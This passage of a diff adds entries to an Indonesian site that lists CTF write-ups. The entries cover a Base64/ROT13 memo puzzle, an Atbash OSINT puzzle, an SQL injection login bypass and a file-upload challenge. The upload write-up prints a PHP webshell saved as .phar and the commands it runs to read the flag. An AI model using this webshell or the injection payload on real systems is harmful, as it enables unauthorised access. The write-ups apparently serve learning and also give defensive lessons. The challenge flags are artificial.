mF4ZXZjZnYgcmFxLWdiLXJhcS4KCkZydHJlbiB5bmNiZXhuYSBncnpobmEgZ256b251bmEgeHJjbnFuIHhiYmVxdmFuZ2JlIHZhZnZxcmEuIEVuY25nIGZ2Z2huZnYgbnhuYQpxdmZyeXJhdHRuZW54bmEgY25xbiBjaHhoeSAxNC4wMCBKVk8gdW5ldiB2YXYuIFhydW5xdmVuYSBmcnloZWh1IG5hdHRiZ24gZ3Z6Cmpud3ZvIGhhZ2h4IHpyem9udW5mIHluYXR4bnUgenZndnRuZnYgcW5hIGVyZmNiYWYgdmFmdnFyYSB5cm92dSB5bmF3aGcuCgpVYmV6bmcgeG56diwKUXZpdmZ2IFhybnpuYW5hIEZ2b3JlCkNHIEFoZm5hZ25lbiBRdnR2Z255Cg String ini diakhiri dengan karakter yang merupakan padding khas dari encoding base64. Hal ini menjadi petunjuk kuat bahwa lapisan pertama encoding adalah base64.Hasil decode-nya adalah:ZRZB VAGREANY ENUNFVNXrcnqn : GvzАнанwrzra CG Ahfnagnen QvtvgnyQnev : Qrcnegrzra Xrnznana VasbeznfvCrevuny : Vafvqra Xrobpbena Qngn Gvaqnx Ynawhg Frtren...Output decode menunjukan teks masih tidak terbaca. Pola ini mengindikasikan encoding ROT13 yang dapat diidentifikasi dari dua ciri: Kata-kata pendek seperti gvz kemungkinan besar tim pergeseran 13 huruf Struktur kalimat masih terlihat spasi, tanda baca utuh , menandakan ini encoding substitusi, bukan enkripsi acakFile SERVER LOG.txt berisi log aktivitas server. Setelah diperiksa, file ini tidak mengandung data relevan untuk menemukan flag dan berfungsi sebagai red herring elemen pengecoh yang umum ditemukan dalam challenge CTF.Berdasarkan seluruh hasil analisis, flag bisa didapatkan dengan mendecode isi dari ENCODE MEMO.txt dengan Base64 kemudian ROT13.Langkah PenyelesaianTool yang digunakan adalah CyberChef. Tool ini dipilih karena kemampuannya melakukan operasi decode secara bersamaan, tanpa menulis skrip. Paste seluruh isi dari file ENCODE MEMO.txt ke kolom input Pada kolom recipe, tambahkan dua operasi berurutan: Pertama: From Base64 Kedua: ROT13 Output final akan muncul otomatis di kolom outputMEMO INTERNAL RAHASIAKepada : Tim Manajemen PT Nusantara DigitalDari : Departemen Keamanan InformasiPerihal : Insiden Kebocoran Data Tindak Lanjut SegeraPada tanggal 15 Mei 2026, sistem kami mendeteksi aktivitas tidak sah yangmengakibatkan kebocoran data dari server produksi. Pelaku diduga menggunakanalat otomatis untuk mengekstrak data konfigurasi sensitif dari direktori yangseharusnya dibatasi aksesnya....Kode darurat yang ditetapkan: flag d0ubl3 l4y3r m3m0 d3c0d3d . Kode ini hanya diperuntukkan bagitim insiden dan harus dijaga kerahasiaannya.Flag ditemukan di paragraf 3, tertulis sebagai kode darurat.Flagflag d0ubl3 l4y3r m3m0 d3c0d3d Kesimpulan Hal yang DipelajariSaya mempelajari banyak hal dari tantangan ini. Saya belajar tentang encoding paling umum di CTF yaitu Base64 dan ROT13. Kedua encoding ini ternyata mudah dikenali secara visual tanpa bantuan tool: Base64 bisa dikenali dengan padding atau di akhir string, sedangkan ROT13 bisa dikenali dengan masih terjaganya struktur kalimat.">
+        Challange ini termasuk ke dalam kategori crypto dan puzzle, berdasarkan instruksi yang diberikan, peserta diminta untuk membuka file yang disediakan dan membaca isinya. Catatan pada soal memberikan petunjuk bahwa data mengandung pola. "Data yang tampak acak selalu menyimpan pola -...
+      </p>
+    </div>
+  </div>
+</div>
+
+<div class="post-excerpt-container">
+  <div class="post-excerpt">
+    
+    
+    
+
+    
+    <a href="/2026/06/10/portal-pemantauan-server.html" class="post-excerpt-image" aria-label="W1-C1 Portal Pemantauan Server">
+      <img src="/images/oxucl-logo.jpg" alt="W1-C1 Portal Pemantauan Server" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
+    </a>
+    
+
+    <div class="post-excerpt-text">
+      <a href="/2026/06/10/portal-pemantauan-server.html">W1-C1 Portal Pemantauan Server</a>
+
+      <div class="post-info">
+  
+    
+    
+      
+      
+        
+
+
+
+<div class="portrait-wrapper">
+  <a href="/members/azizul-manal-gaumalanga.html" class="portrait" data-style="tiny" aria-label="Azizul Manal Gaumalanga">
+    
+
+    <img src="/images/default-avatar.svg" class="portrait-image" alt="member portrait" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
+
+    
+      <span class="portrait-name">
+        Azizul Manal Gaumalanga
+      </span>
+    
+
+    
+
+    
+      <span class="portrait-affiliation">
+        Teknik Informatika (2024)
+      </span>
+    
+  </a>
+</div>
+
+      
+    
+  
+
+  
+  
+
+  
+    <span data-tooltip="Originally published on">
+      <i class="icon fa-regular fa-calendar"></i>
+      <span>June 10, 2026</span>
+    </span>
+  
+
+  
+    <span data-tooltip="Last updated on">
+      <i class="icon fa-solid fa-clock-rotate-left"></i>
+      <span>June 12, 2026</span>
+    </span>
+  
+</div>
+
+
+  
+
+
+  <div class="tags">
+    
+      <a href="/writeups?search=%22tag:%20web%22" class="tag" data-tooltip='Show items with the tag "web"'>
+        web
+      </a>
+    
+      <a href="/writeups?search=%22tag:%20zero-day-2026%22" class="tag" data-tooltip='Show items with the tag "zero-day-2026"'>
+        zero-day-2026
+      </a>
+    
+  </div>
+
+
+
+
+
+      
+      
+      
+      
+      <p data-search="Detail Soal Field Value Nama Challenge Portal Pemantauan Server Kategori Web Breach Event ZERO DAY Scholar Battle Poin 100 Difficulty Easy File - Deskripsi SingkatChallenge W1-C1: Portal Pemantauan Server merupakan challenge kategori Web Breach. Pada challenge ini diberikan sebuah portal pemantauan server milik PT Infranet Solusi. Panel administrasi portal tersebut menyimpan token keamanan rahasia yang hanya dapat diakses oleh administrator.Tujuan dari challenge ini adalah mendapatkan akses ke panel admin dan mengambil token atau flag yang tersimpan di dalamnya.Analisis AwalLangkah pertama yang saya lakukan adalah membuka halaman utama portal. Pada halaman tersebut terdapat beberapa informasi status server dan menu Lupa Password. Setelah memeriksa source code halaman awal, ditemukan komentar HTML yang menunjukkan lokasi halaman login administrator. lt; -- auth login.php -- gt;Dari informasi tersebut, saya membuka halaman auth login.php. Halaman ini memiliki form login dengan input username dan password. Berdasarkan catatan challenge yang berbunyi: Akses yang tidak sah seringkali bukan soal kata sandi yang lemah, melainkan logika yang cacat. Saya menyimpulkan bahwa celah kemungkinan berada pada proses autentikasi, bukan pada brute force password. Karena halaman login menerima input username dan password, saya mencoba menguji kemungkinan adanya SQL Injection pada form login.Langkah PenyelesaianPada halaman login administrator, saya mencoba memasukkan payload SQL Injection sederhana pada field username.Payload yang digunakan:admin --Kemudian field password dapat diisi dengan nilai bebas, karena bagian pengecekan password akan dikomentari oleh payload SQL Injection tersebut.Contoh input:Username: admin --Password: bebasJika query login di backend dibuat secara tidak aman, kemungkinan bentuk query-nya seperti berikut:SELECT FROM users WHERE username admin AND password ... ;Setelah payload dimasukkan, query dapat berubah menjadi:SELECT FROM users WHERE username admin -- AND password ... ;Tanda -- membuat bagian setelahnya dianggap sebagai komentar, sehingga pengecekan password tidak lagi diproses. Dengan begitu, login berhasil dilakukan sebagai user admin.Setelah berhasil masuk, halaman panel admin menampilkan informasi sesi sebagai administrator dan menampilkan token keamanan sistem. Pada bagian Token Keamanan Sistem, ditemukan flag challenge.Flagflag sql1 byp4ss 4dm1n p4n3l Kesimpulan Hal yang DipelajariDari challenge ini, saya mempelajari bahwa celah keamanan pada proses login tidak selalu berasal dari password yang lemah, tetapi bisa berasal dari validasi input dan query database yang tidak aman. SQL Injection dapat terjadi ketika input pengguna langsung digabungkan ke dalam query SQL tanpa proses sanitasi atau penggunaan prepared statement.Challenge ini juga menunjukkan pentingnya memeriksa source code halaman, karena komentar HTML pada halaman awal memberikan petunjuk menuju halaman login administrator. Selain itu, penggunaan query SQL yang aman sangat penting agar autentikasi tidak dapat dilewati hanya dengan memanipulasi input login.">
+        Challenge W1-C1: Portal Pemantauan Server merupakan challenge kategori Web Breach. Pada challenge ini diberikan sebuah portal pemantauan server milik PT Infranet Solusi. Panel administrasi portal tersebut menyimpan token keamanan rahasia yang hanya dapat diakses oleh administrator. Tujuan dari challenge ini...
+      </p>
+    </div>
+  </div>
+</div>
+
+<div class="post-excerpt-container">
+  <div class="post-excerpt">
+    
+    
+    
+
+    
+    <a href="/2026/06/10/profil-terbuka.html" class="post-excerpt-image" aria-label="W1-B2 Profil Terbuka">
+      <img src="/images/oxucl-logo.jpg" alt="W1-B2 Profil Terbuka" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
+    </a>
+    
+
+    <div class="post-excerpt-text">
+      <a href="/2026/06/10/profil-terbuka.html">W1-B2 Profil Terbuka</a>
+
+      <div class="post-info">
+  
+    
+    
+      
+      
+        
+
+
+
+<div class="portrait-wrapper">
+  <a href="/members/azizul-manal-gaumalanga.html" class="portrait" data-style="tiny" aria-label="Azizul Manal Gaumalanga">
+    
+
+    <img src="/images/default-avatar.svg" class="portrait-image" alt="member portrait" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
+
+    
+      <span class="portrait-name">
+        Azizul Manal Gaumalanga
+      </span>
+    
+
+    
+
+    
+      <span class="portrait-affiliation">
+        Teknik Informatika (2024)
+      </span>
+    
+  </a>
+</div>
+
+      
+    
+  
+
+  
+  
+
+  
+    <span data-tooltip="Originally published on">
+      <i class="icon fa-regular fa-calendar"></i>
+      <span>June 10, 2026</span>
+    </span>
+  
+
+  
+    <span data-tooltip="Last updated on">
+      <i class="icon fa-solid fa-clock-rotate-left"></i>
+      <span>June 12, 2026</span>
+    </span>
+  
+</div>
+
+
+  
+
+
+  <div class="tags">
+    
+      <a href="/writeups?search=%22tag:%20osint%22" class="tag" data-tooltip='Show items with the tag "osint"'>
+        osint
+      </a>
+    
+      <a href="/writeups?search=%22tag:%20recon%22" class="tag" data-tooltip='Show items with the tag "recon"'>
+        recon
+      </a>
+    
+      <a href="/writeups?search=%22tag:%20zero-day-2026%22" class="tag" data-tooltip='Show items with the tag "zero-day-2026"'>
+        zero-day-2026
+      </a>
+    
+  </div>
+
+
+
+
+
+      
+      
+      
+      
+      <p data-search="Detail Soal Field Value Nama Challenge Profil Terbuka Kategori Recon OSINT Event ZERO DAY Scholar Battle Poin 100 Difficulty Easy File - Deskripsi SingkatChallenge W1-B2: Profil Terbuka merupakan soal kategori Recon OSINT. Pada challenge ini, peserta diminta menelusuri profil publik Sari Dewi, seorang IT Security Analyst yang dikenal dengan julukan berkaitan dengan cermin . Informasi sensitif disembunyikan di beberapa bagian profilnya dalam bentuk yang tidak langsung terbaca. Peserta perlu mengikuti jejak yang tersedia, melakukan proses decoding, lalu mengubah hasil flag ke format huruf kecil flag ... sebelum disubmit.Analisis AwalPada tahap awal, saya membuka halaman utama Direktori Profil Publik Sari Dewi. Di halaman tersebut terdapat beberapa tautan yang mengarah ke arsip profil publik, yaitu Twitter Archive dan LinkedIn Export. Karena challenge ini termasuk kategori Recon OSINT, saya mulai menelusuri setiap informasi yang tersedia pada halaman tersebut.Dari halaman Twitter Archive, ditemukan sebuah petunjuk bahwa Sari Dewi memiliki blog lama dengan nama file sari blog.html. Selain itu, terdapat tweet yang menyebutkan bahwa ia menyukai kode cermin dan sebuah cipher klasik yang memiliki sifat encode dan decode dengan cara yang sama. Petunjuk ini penting karena istilah cermin mengarah pada konsep pertukaran huruf secara berlawanan dalam alfabet.Cipher klasik yang sesuai dengan petunjuk tersebut adalah Atbash Cipher. Pada Atbash, huruf alfabet dicerminkan dari depan ke belakang, misalnya A menjadi Z, B menjadi Y, C menjadi X, dan seterusnya. Karena prosesnya hanya mencerminkan huruf, metode yang sama dapat digunakan untuk encode maupun decode.Saya kemudian membuka halaman sari blog.html. Pada halaman blog tersebut terdapat bagian Catatan Rahasia yang mengarahkan pengguna untuk membaca halaman about me.html. Setelah membuka halaman tersebut, ditemukan informasi yang semakin memperkuat dugaan sebelumnya, yaitu Sari Dewi memiliki alias Cermin Dunia dan secara langsung menyebut bahwa ia menyukai Atbash.Pada halaman about me.html, ditemukan pesan rahasia berikut:UOZT 4GY4HS X3IN1M W3X0W3W Berdasarkan petunjuk kode cermin , sifat encode dan decode yang sama, serta penyebutan Atbash pada halaman profil, dapat disimpulkan bahwa pesan tersebut perlu didekode menggunakan Atbash Cipher.Langkah PenyelesaianLangkah pertama adalah membuka halaman utama challenge dan membaca seluruh tautan yang tersedia. Dari halaman utama ditemukan dua sumber informasi, yaitu twitter archive.html dan linkedin export.txt.Selanjutnya, saya membuka twitter archive.html dan menemukan petunjuk bahwa blog lama Sari Dewi berada pada halaman:sari blog.htmlPada arsip Twitter juga terdapat petunjuk mengenai kode cermin , yang mengarah ke cipher klasik dengan proses encode dan decode yang sama.Setelah itu, saya membuka halaman sari blog.html. Di dalam source dan isi halaman blog, terdapat petunjuk menuju halaman lain, yaitu:about me.htmlKemudian saya membuka halaman about me.html dan menemukan pesan rahasia berikut:UOZT 4GY4HS X3IN1M W3X0W3W Karena halaman tersebut secara eksplisit menyebut Atbash, maka pesan tersebut didekode menggunakan Atbash Cipher. Proses decoding menghasilkan:FLAG 4TB4SH C3RM1N D3C0D3D Setelah hasil decode didapatkan, isi flag masih menggunakan bentuk leetspeak. Angka pada teks tersebut dapat dibaca sebagai huruf: Angka Huruf 4 A 3 E 1 I 0 O Sehingga isi flag menjadi:ATBASH CERMIN DECODEDKarena format submit challenge menggunakan huruf kecil, maka flag akhir ditulis dalam lowercase.Flagflag atbash cermin decoded Kesimpulan Hal yang DipelajariDari challenge ini, saya belajar bahwa pada soal Recon OSINT, informasi penting tidak selalu langsung terlihat di halaman utama. Peserta perlu mengikuti setiap jejak digital yang tersedia, seperti arsip Twitter, export LinkedIn, blog, komentar HTML, dan halaman tersembunyi.Selain itu, challenge ini juga menunjukkan bahwa petunjuk narasi seperti cermin dapat mengarah pada teknik kriptografi tertentu, yaitu Atbash Cipher. Dengan memahami konteks dan menghubungkan setiap petunjuk, pesan rahasia dapat didekode hingga menghasilkan flag yang benar.">
+        Challenge W1-B2: Profil Terbuka merupakan soal kategori Recon / OSINT. Pada challenge ini, peserta diminta menelusuri profil publik Sari Dewi, seorang IT Security Analyst yang dikenal dengan julukan berkaitan dengan “cermin”. Informasi sensitif disembunyikan di beberapa bagian profilnya dalam bentuk...
+      </p>
+    </div>
+  </div>
+</div>
+
+<div class="post-excerpt-container">
+  <div class="post-excerpt">
+    
+    
+    
+
+    
+    <a href="/2026/06/10/upload-dokumen.html" class="post-excerpt-image" aria-label="W1-C3 Upload Dokumen">
+      <img src="/images/oxucl-logo.jpg" alt="W1-C3 Upload Dokumen" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
+    </a>
+    
+
+    <div class="post-excerpt-text">
+      <a href="/2026/06/10/upload-dokumen.html">W1-C3 Upload Dokumen</a>
+
+      <div class="post-info">
+  
+    
+    
+      
+      
+        
+
+
+
+<div class="portrait-wrapper">
+  <a href="/members/azizul-manal-gaumalanga.html" class="portrait" data-style="tiny" aria-label="Azizul Manal Gaumalanga">
+    
+
+    <img src="/images/default-avatar.svg" class="portrait-image" alt="member portrait" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
+
+    
+      <span class="portrait-name">
+        Azizul Manal Gaumalanga
+      </span>
+    
+
+    
+
+    
+      <span class="portrait-affiliation">
+        Teknik Informatika (2024)
+      </span>
+    
+  </a>
+</div>
+
+      
+    
+  
+
+  
+  
+
+  
+    <span data-tooltip="Originally published on">
+      <i class="icon fa-regular fa-calendar"></i>
+      <span>June 10, 2026</span>
+    </span>
+  
+
+  
+    <span data-tooltip="Last updated on">
+      <i class="icon fa-solid fa-clock-rotate-left"></i>
+      <span>June 12, 2026</span>
+    </span>
+  
+</div>
+
+
+  
+
+
+  <div class="tags">
+    
+      <a href="/writeups?search=%22tag:%20web%22" class="tag" data-tooltip='Show items with the tag "web"'>
+        web
+      </a>
+    
+      <a href="/writeups?search=%22tag:%20zero-day-2026%22" class="tag" data-tooltip='Show items with the tag "zero-day-2026"'>
+        zero-day-2026
+      </a>
+    
+  </div>
+
+
+
+
+
+      
+      
+      
+      
+      <p data-search="Detail Soal Field Value Nama Challenge W1-C3: Upload Dokumen Kategori Web Breach Event ZERO DAY Mini Games 2026 Deskripsi SingkatChallenge W1-C3: Upload Dokumen merupakan challenge Web Breach yang membahas celah pada fitur upload file. Website menyediakan portal upload dokumen internal milik PT Infranet Solusi. Berdasarkan narasi dan catatan challenge, fokus utama penyelesaian adalah mencari kelemahan pada kebijakan validasi file upload.Analisis AwalSaat pertama kali membuka website, ditemukan halaman login pegawai. Setelah melihat source code halaman, terdapat komentar HTML yang berisi kredensial login. lt; -- Akses portal pegawai: pegawai BerkasUji2026 -- gt;Dari komentar tersebut, saya mendapatkan username dan password berikut.Username: pegawaiPassword: BerkasUji2026Setelah berhasil login, saya diarahkan ke halaman Sistem Upload Dokumen Internal. Pada halaman tersebut terdapat fitur upload file dengan keterangan bahwa sistem menerima file dokumen standar seperti PDF, DOCX, XLS, TXT, CSV, JPG, dan PNG.Sistem ini menerima dokumen kerja standar: PDF, DOCX, XLS, TXT, CSV, JPG, dan PNG.Catatan challenge juga memberikan petunjuk berikut. Daftar larangan yang tidak lengkap sama bahayanya dengan tidak ada daftar larangan sama sekali. Petunjuk tersebut mengarah pada kemungkinan bahwa sistem menggunakan blacklist extension. Jika daftar ekstensi yang diblokir tidak lengkap, maka ekstensi lain yang masih dapat diproses sebagai PHP bisa digunakan untuk bypass upload.Langkah PenyelesaianLangkah pertama adalah login menggunakan kredensial yang ditemukan pada komentar HTML.pegawai BerkasUji2026Setelah masuk ke halaman upload, saya membuat file webshell PHP sederhana dengan nama:a.pharIsi payload yang digunakan adalah sebagai berikut. lt; phpecho OK lt;br gt; ;if isset GET cmd echo lt;pre gt; ; system GET cmd ; echo lt; pre gt; ; gt;Ekstensi .phar digunakan karena pada beberapa konfigurasi server PHP, file dengan ekstensi tersebut masih dapat dieksekusi sebagai script PHP. Selain itu, ekstensi .phar tidak termasuk dalam daftar ekstensi yang diblokir oleh sistem, sehingga file berhasil diunggah.Setelah upload berhasil, file dapat diakses melalui direktori upload. uploads a.pharSaat file dibuka, halaman menampilkan output:OKHal ini menunjukkan bahwa file berhasil diakses dan script PHP di dalamnya berjalan.Selanjutnya, saya menguji eksekusi command menggunakan parameter cmd. uploads a.phar cmd idHasilnya menunjukkan bahwa command berhasil dijalankan oleh server.uid 33 www-data gid 33 www-data groups 33 www-data Output tersebut membuktikan bahwa celah upload berhasil dimanfaatkan menjadi Remote Code Execution dengan user www-data.Setelah itu, saya melakukan enumerasi direktori root menggunakan command berikut. uploads a.phar cmd ls -la Dari hasil listing, ditemukan bahwa server berjalan di dalam container dan terdapat direktori var www.Kemudian saya mengecek isi direktori var www. uploads a.phar cmd ls -la var wwwHasilnya menunjukkan adanya dua direktori penting.htmlprivateDirektori html digunakan sebagai webroot, sedangkan direktori private mencurigakan karena berada di luar webroot dan biasanya digunakan untuk menyimpan file sensitif.Saya kemudian mengecek isi direktori var www private. uploads a.phar cmd ls -la var www private 2 gt; amp;1Hasilnya ditemukan file flag.-rw-r----- 1 root www-data 29 Jun 2 04:17 flag.txtPermission file tersebut menunjukkan bahwa file dimiliki oleh user root, tetapi group-nya adalah www-data. Karena webshell berjalan sebagai www-data, file tersebut tetap dapat dibaca.Langkah terakhir adalah membaca isi file flag. uploads a.phar cmd cat var www private flag.txtDari command tersebut, flag berhasil didapatkan.Flagflag ph4r upl04d byp4ss rce Kesimpulan Hal yang DipelajariChallenge ini menunjukkan bahwa validasi upload file menggunakan blacklist tidak aman jika daftar ekstensi yang diblokir tidak lengkap. Meskipun ekstensi umum seperti .php atau .phtml dapat diblokir, ekstensi lain seperti .phar masih dapat dimanfaatkan apabila server tetap mengeksekusinya sebagai script PHP.Dari challenge ini, saya belajar bahwa fitur upload file harus divalidasi menggunakan whitelist yang ketat, bukan hanya blacklist. Selain itu, server juga sebaiknya tidak mengizinkan eksekusi script di direktori upload, melakukan pengecekan MIME type dan isi file, mengganti nama file saat disimpan, serta menyimpan file upload di lokasi yang aman.">
+        Challenge W1-C3: Upload Dokumen merupakan challenge Web Breach yang membahas celah pada fitur upload file. Website menyediakan portal upload dokumen internal milik PT Infranet Solusi. Berdasarkan narasi dan catatan challenge, fokus utama penyelesaian adalah mencari kelemahan pada kebijakan validasi file...
+      </p>
+    </div>
+  </div>
+</div>
+
+<div class="post-excerpt-container">
+  <div class="post-excerpt">
+    
+    
+    
+
+    
     <a href="/2026/06/03/warmup-selamat-datang.html" class="post-excerpt-image" aria-label="W1-F1 Warmup: Selamat Datang">
       <img src="/images/oxucl-logo.jpg" alt="W1-F1 Warmup: Selamat Datang" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
     </a>
@@ -1946,7 +2016,7 @@ Gunakan search atau tag untuk mencari kategori tertentu.</p>
   <a href="/members/azizul-manal-gaumalanga.html" class="portrait" data-style="tiny" aria-label="Azizul Manal Gaumalanga">
     
 
-    <img src="/images/logo.jpg" class="portrait-image" alt="member portrait" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
+    <img src="/images/default-avatar.svg" class="portrait-image" alt="member portrait" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
 
     
       <span class="portrait-name">
@@ -1981,7 +2051,7 @@ Gunakan search atau tag untuk mencari kategori tertentu.</p>
   
     <span data-tooltip="Last updated on">
       <i class="icon fa-solid fa-clock-rotate-left"></i>
-      <span>June 10, 2026</span>
+      <span>June 12, 2026</span>
     </span>
   
 </div>
